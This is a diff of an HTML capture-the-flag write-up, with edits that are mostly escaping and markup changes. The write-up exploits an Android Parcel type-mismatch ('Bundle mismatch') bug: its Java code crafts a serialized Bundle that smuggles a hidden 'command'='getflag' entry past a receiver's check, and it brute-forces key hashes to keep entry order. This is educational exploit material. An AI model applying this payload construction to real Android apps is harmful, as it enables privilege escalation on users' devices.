@@ -317,8 +317,8 @@ parcel.setDataPosition(endPos);</code></pre><p><code>pacel.writeArrayMapInternal
             writeParcelable((Parcelable) v, <span class="hljs-number">0</span>);</code></pre><p>We can use this code to get the bytes from marshal.</p>
 <pre class="hljs"><code>Bundle bundle = <span class="hljs-keyword">new</span> Bundle();
 bundle.putParcelable(AccountManager.KEY_INTENT, <span class="hljs-keyword">new</span> MainActivity$Message()));
-<span class="hljs-keyword">byte</span>[] bs = {<span class="hljs-string">'a'</span>, <span class="hljs-string">'a'</span>,<span class="hljs-string">'a'</span>, <span class="hljs-string">'a'</span>};
-bundle.putByteArray(<span class="hljs-string">"AAA"</span>, bs);
+<span class="hljs-keyword">byte</span>[] bs = {<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>};
+bundle.putByteArray(<span class="hljs-string">&quot;AAA&quot;</span>, bs);
 Parcel testData = Parcel.obtain();
 bundle.writeToParcel(testData, <span class="hljs-number">0</span>);
 <span class="hljs-keyword">byte</span>[] raw = testData.marshall();</code></pre><p class="img-container"><img src="./1.png" alt=""></p>
@@ -328,10 +328,14 @@ PAD_SIZE will make the length of unit be the multipiles of 4.</p>
 <p><code>MainActivity$Message</code> is a class implementing from <code>Parceable</code>.
 There are two type-difference:</p>
 <ol class="list">
-<li><pre class="hljs"><code><span class="hljs-keyword">this</span>.txRate = <span class="hljs-keyword">in</span>.readInt();
-dest.writeByte((byte) <span class="hljs-keyword">this</span>.txRate);</code></pre></li>
-<li><pre class="hljs"><code><span class="hljs-keyword">this</span>.rttSpread = <span class="hljs-keyword">in</span>.readLong();
-dest.writeInt((int) <span class="hljs-keyword">this</span>.rttSpread);</code></pre></li>
+<li><pre class="prettyprint">this.txRate = in.readInt();
+dest.writeByte((byte) this.txRate);
+</pre>
+</li>
+<li><pre class="prettyprint">this.rttSpread = in.readLong();
+dest.writeInt((int) this.rttSpread);
+</pre>
+</li>
 </ol>
 <p>Through test I found that the first type-difference which in byte and int will not create influence, because of PAD_SIZE.
 So the second type-difference will cover 4 bytes after <code>Message</code> object every times <code>readFromParcel</code> and <code>writeToParcel</code>.</p>
@@ -350,8 +354,7 @@ So the second type-difference will cover 4 bytes after <code>Message</code> obje
 <th>content_value</th>
 </tr>
 </thead>
-<tbody>
-<tr>
+<tbody><tr>
 <td>pad</td>
 <td>15 00 00 00</td>
 <td>07 00 00 00 &quot;command&quot; 00 00 00 00 00 00 07 00 00 00 &quot;getflag&quot; 00 00</td>
@@ -367,8 +370,7 @@ So the second type-difference will cover 4 bytes after <code>Message</code> obje
 <td>07 00 00 00</td>
 <td>&quot;getflag&quot; 00 00</td>
 </tr>
-</tbody>
-</table>
+</tbody></table>
 <p>The format of string is UTF-16, two bytes every char.
 type=0 means <code>VAL_STRING</code>.</p>
 <p>Another need to do is that <code>Receiver2</code> need <code>bundle.getString(&quot;command&quot;)!=null</code>, so we need another key-value pair <code>&#39;command&#39;=&#39;xxx&#39;</code>.</p>
@@ -376,10 +378,10 @@ type=0 means <code>VAL_STRING</code>.</p>
 <pre class="hljs"><code>        Parcel a = Parcel.obtain();
         Parcel b = Parcel.obtain();
         a.writeInt(<span class="hljs-number">3</span>);<span class="hljs-comment">//Count</span>
-        a.writeString(<span class="hljs-string">"mismatch"</span>);
+        a.writeString(<span class="hljs-string">&quot;mismatch&quot;</span>);
         a.writeInt(<span class="hljs-number">4</span>);<span class="hljs-comment">//Parcable</span>
-        a.writeString(<span class="hljs-string">"com.de1ta.broadcasttest.MainActivity$Message"</span>);
-        a.writeString(<span class="hljs-string">"bssid"</span>);
+        a.writeString(<span class="hljs-string">&quot;com.de1ta.broadcasttest.MainActivity$Message&quot;</span>);
+        a.writeString(<span class="hljs-string">&quot;bssid&quot;</span>);
         a.writeInt(<span class="hljs-number">1</span>);
         a.writeInt(<span class="hljs-number">2</span>);
         a.writeInt(<span class="hljs-number">3</span>);
@@ -400,12 +402,12 @@ type=0 means <code>VAL_STRING</code>.</p>
         <span class="hljs-comment">// \0\0 =&gt; hide_type_value</span>
         <span class="hljs-comment">// \7\0 =&gt; hide_len_value</span>
         <span class="hljs-comment">// getflag\0 =&gt; hide_content_value</span>
-        a.writeString(<span class="hljs-string">"\7\0command\0\0\0\7\0getflag"</span>);
+        a.writeString(<span class="hljs-string">&quot;\7\0command\0\0\0\7\0getflag&quot;</span>);
         a.writeInt(<span class="hljs-number">0</span>);<span class="hljs-comment">//fake_type</span>
-        a.writeString(<span class="hljs-string">""</span>);<span class="hljs-comment">//fake_value</span>
-        a.writeString(<span class="hljs-string">"command"</span>);<span class="hljs-comment">//for bundle.getString("command")!=null</span>
+        a.writeString(<span class="hljs-string">&quot;&quot;</span>);<span class="hljs-comment">//fake_value</span>
+        a.writeString(<span class="hljs-string">&quot;command&quot;</span>);<span class="hljs-comment">//for bundle.getString(&quot;command&quot;)!=null</span>
         a.writeInt(<span class="hljs-number">0</span>);
-        a.writeString(<span class="hljs-string">"gotflag"</span>);
+        a.writeString(<span class="hljs-string">&quot;gotflag&quot;</span>);
         <span class="hljs-keyword">int</span> len = a.dataSize();
         b.writeInt(len);
         b.writeInt(<span class="hljs-number">0x4c444E42</span>);
@@ -414,11 +416,11 @@ type=0 means <code>VAL_STRING</code>.</p>
 
         <span class="hljs-keyword">byte</span>[] raw = b.marshall();
         String output = Base64.encodeToString(raw, <span class="hljs-number">0</span>);
-        Log.i(<span class="hljs-string">"test"</span>, output);</code></pre><h2 id="other"><a class="header-link" href="#other"></a>Other</h2>
+        Log.i(<span class="hljs-string">&quot;test&quot;</span>, output);</code></pre><h2 id="other"><a class="header-link" href="#other"></a>Other</h2>
 <p>I use this payload1 in match:</p>
-<pre class="hljs"><code>a.writeString(<span class="hljs-string">"\7\0command\0\0\0\7\0getflag\0"</span>);
+<pre class="hljs"><code>a.writeString(<span class="hljs-string">&quot;\7\0command\0\0\0\7\0getflag\0&quot;</span>);
 a.writeInt(<span class="hljs-number">0</span>);<span class="hljs-comment">//fake_type</span>
-a.writeString(<span class="hljs-string">"1"</span>);<span class="hljs-comment">//fake_value</span></code></pre><p>But marshaling shows that fake_key contains 3 zero char after &#39;getflag&#39;. It costs 6 bytes.
+a.writeString(<span class="hljs-string">&quot;1&quot;</span>);<span class="hljs-comment">//fake_value</span></code></pre><p>But marshaling shows that fake_key contains 3 zero char after &#39;getflag&#39;. It costs 6 bytes.
 I search it and find that <code>writeString</code> method will put &#39;\0&#39; to the end of string, then pad size.</p>
 <p>But if I remove the zero, <code>writeString(&quot;\7\0command\0\0\0\7\0getflag&quot;)</code>, the end zero will be at the end. It costs 44 bytes without padding.
 The structure is </p>
@@ -438,8 +440,7 @@ The structure is </p>
 <th>content_value2</th>
 </tr>
 </thead>
-<tbody>
-<tr>
+<tbody><tr>
 <td>pad</td>
 <td>15 00 00 00</td>
 <td>07 00 00 00 &quot;command&quot; 00 00 00 00 00 00 07 00 00 00 &quot;getflag&quot; 00 00</td>
@@ -465,8 +466,7 @@ The structure is </p>
 <td>07 00 00 00</td>
 <td>&quot;command&quot;</td>
 </tr>
-</tbody>
-</table>
+</tbody></table>
 <p>We can find the <code>type_value2</code> is error.
 So we need to construct <code>fake_value1=&quot;&quot;</code>.</p>
 <table>
@@ -485,8 +485,7 @@ So we need to construct <code>fake_value1=&quot;&quot;</code>.</p>
 <th>content_value2</th>
 </tr>
 </thead>
-<tbody>
-<tr>
+<tbody><tr>
 <td>pad</td>
 <td>15 00 00 00</td>
 <td>07 00 00 00 &quot;command&quot; 00 00 00 00 00 00 07 00 00 00 &quot;getflag&quot; 00 00</td>
@@ -512,15 +511,14 @@ So we need to construct <code>fake_value1=&quot;&quot;</code>.</p>
 <td>07 00 00 00</td>
 <td>&quot;command&quot;</td>
 </tr>
-</tbody>
-</table>
+</tbody></table>
 <p>This is the payload2:</p>
-<pre class="hljs"><code>a.writeString(<span class="hljs-string">"\7\0command\0\0\0\7\0getflag"</span>);
+<pre class="hljs"><code>a.writeString(<span class="hljs-string">&quot;\7\0command\0\0\0\7\0getflag&quot;</span>);
 a.writeInt(<span class="hljs-number">0</span>);<span class="hljs-comment">//fake_type</span>
-a.writeString(<span class="hljs-string">""</span>);<span class="hljs-comment">//fake_value</span></code></pre><p>For validating my suppose, I use payload3:</p>
-<pre class="hljs"><code>a.writeString(<span class="hljs-string">"\7\0command\0\0\0\7\0getflag\0\0"</span>);
+a.writeString(<span class="hljs-string">&quot;&quot;</span>);<span class="hljs-comment">//fake_value</span></code></pre><p>For validating my suppose, I use payload3:</p>
+<pre class="hljs"><code>a.writeString(<span class="hljs-string">&quot;\7\0command\0\0\0\7\0getflag\0\0&quot;</span>);
 a.writeInt(<span class="hljs-number">0</span>);<span class="hljs-comment">//fake_type</span>
-a.writeString(<span class="hljs-string">"1"</span>);<span class="hljs-comment">//fake_value</span></code></pre><p>The bundle created by this payload should be the same as the bundle created by payload1 except <code>length</code>.
+a.writeString(<span class="hljs-string">&quot;1&quot;</span>);<span class="hljs-comment">//fake_value</span></code></pre><p>The bundle created by this payload should be the same as the bundle created by payload1 except <code>length</code>.
 Yes, it is.
 But <code>Receiver3</code> refuse the bundle and raise a exception.
 I check it and find the order changed:
@@ -536,21 +534,21 @@ It needs to be lower than the hash of key of Message.</p>
         <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> hash = key == <span class="hljs-keyword">null</span> ? <span class="hljs-number">0</span>
                 : (mIdentityHashCode ? System.identityHashCode(key) : key.hashCode());
         <span class="hljs-keyword">if</span> (index &gt;= mHashes.length) {
-            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalStateException(<span class="hljs-string">"Array is full"</span>);
+            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalStateException(<span class="hljs-string">&quot;Array is full&quot;</span>);
         }
         <span class="hljs-keyword">if</span> (index &gt; <span class="hljs-number">0</span> &amp;&amp; mHashes[index-<span class="hljs-number">1</span>] &gt; hash) {
-            RuntimeException e = <span class="hljs-keyword">new</span> RuntimeException(<span class="hljs-string">"here"</span>);
+            RuntimeException e = <span class="hljs-keyword">new</span> RuntimeException(<span class="hljs-string">&quot;here&quot;</span>);
             e.fillInStackTrace();
-            Log.w(TAG, <span class="hljs-string">"New hash "</span> + hash
-                    + <span class="hljs-string">" is before end of array hash "</span> + mHashes[index-<span class="hljs-number">1</span>]
-                    + <span class="hljs-string">" at index "</span> + index + <span class="hljs-string">" key "</span> + key, e);
+            Log.w(TAG, <span class="hljs-string">&quot;New hash &quot;</span> + hash
+                    + <span class="hljs-string">&quot; is before end of array hash &quot;</span> + mHashes[index-<span class="hljs-number">1</span>]
+                    + <span class="hljs-string">&quot; at index &quot;</span> + index + <span class="hljs-string">&quot; key &quot;</span> + key, e);
             put(key, value);
             <span class="hljs-keyword">return</span>;
         }</code></pre><p>So I think the value of hash is important to pwn the vulnerability.
 The value of hash of key is <code>-1841832101</code>, so we just need to find a key with lower hash.</p>
-<pre class="hljs"><code>        String key = <span class="hljs-string">"mismatch"</span>;
+<pre class="hljs"><code>        String key = <span class="hljs-string">&quot;mismatch&quot;</span>;
         <span class="hljs-keyword">while</span>(key.hashCode()&gt;=-<span class="hljs-number">1841832101</span>){
-            key += <span class="hljs-string">"."</span>;
+            key += <span class="hljs-string">&quot;.&quot;</span>;
         }
         a.writeString(key); <span class="hljs-comment">// key of Message object</span>
 </code></pre><p><a href="./gen_payload.zip">This</a> is a project of AndroidStudio which can generate the exploit payload.</p>
